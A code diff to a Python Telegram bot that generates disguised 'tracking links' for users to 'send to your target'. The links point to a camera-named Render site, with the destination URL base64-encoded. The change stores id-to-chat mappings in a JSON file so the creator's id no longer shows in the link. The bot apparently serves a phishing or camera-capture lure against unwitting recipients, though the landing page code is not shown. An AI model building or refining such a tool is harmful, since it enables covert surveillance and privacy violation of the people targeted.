@@ -1,6 +1,8 @@
 import logging
 import uuid
 import base64
+import json
+import os
 from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
 from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, CommandHandler, filters
 from telegram.error import TelegramError
@@ -12,6 +14,21 @@ logging.basicConfig(
 
 RENDER_BASE_URL = "https://camera-y1vl.onrender.com"
 CHANNEL_USERNAME = "@TeamLolOfficial"
+MAPPING_FILE = "mappings.json"
+
+# JSON ফাইল লোড বা সেভ করার ফাংশন
+def save_mapping(unique_id, chat_id):
+    data = {}
+    if os.path.exists(MAPPING_FILE):
+        try:
+            with open(MAPPING_FILE, "r") as f:
+                data = json.load(f)
+        except Exception:
+            data = {}
+    
+    data[unique_id] = str(chat_id)
+    with open(MAPPING_FILE, "w") as f:
+        json.dump(data, f)
 
 async def check_channel_membership(bot, user_id):
     try:
@@ -38,7 +55,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Shurute state reset kora
     context.user_data['waiting_for_url'] = False
 
     reply_markup = ReplyKeyboardMarkup(
@@ -78,16 +94,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         input_field_placeholder="Click Create Link button..."
     )
 
-    # Jodi user "🔗 Create Link" button-e click kore
     if user_text == "🔗 Create Link":
         context.user_data['waiting_for_url'] = True
         await update.message.reply_text(
-            "🌐 Please Enter A valid Url",
+            "Enter a valid url",
             reply_markup=reply_markup
         )
         return
 
-    # Jodi user age button-e click kore thake ebong ekhon link dey
     if context.user_data.get('waiting_for_url', False):
         target_url = user_text
         if not (target_url.startswith("http://") or target_url.startswith("https://")):
@@ -96,6 +110,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         encoded_url = base64.urlsafe_b64encode(target_url.encode()).decode()
         unique_id = str(uuid.uuid4())[:6]
         
+        # Mapping save করা হচ্ছে যাতে লিংকে কোনো আইডি না থাকে
+        save_mapping(unique_id, user_id)
+        
+        # লিংকে শুধু id এবং url থাকবে, কোনো id/cid শো করবে না
         tracking_link = f"{RENDER_BASE_URL}/?id={unique_id}&url={encoded_url}"
         
         response_msg = (
@@ -104,11 +122,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"📤 Send this link to your target:\n{tracking_link}"
         )
         
-        # Link toiri sesh, abar state false kore dewa holo
         context.user_data['waiting_for_url'] = False
         await update.message.reply_text(response_msg, parse_mode="Markdown", reply_markup=reply_markup)
     else:
-        # Jodi button-e click na kore random text dey
         await update.message.reply_text(
             "Please click the **🔗 Create Link** button first.",
             reply_markup=reply_markup,
@@ -123,5 +139,5 @@ if __name__ == '__main__':
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
 
-    print("Bot is running perfectly...")
+    print("JSON Mapped Dynamic link bot is running...")
     application.run_polling()
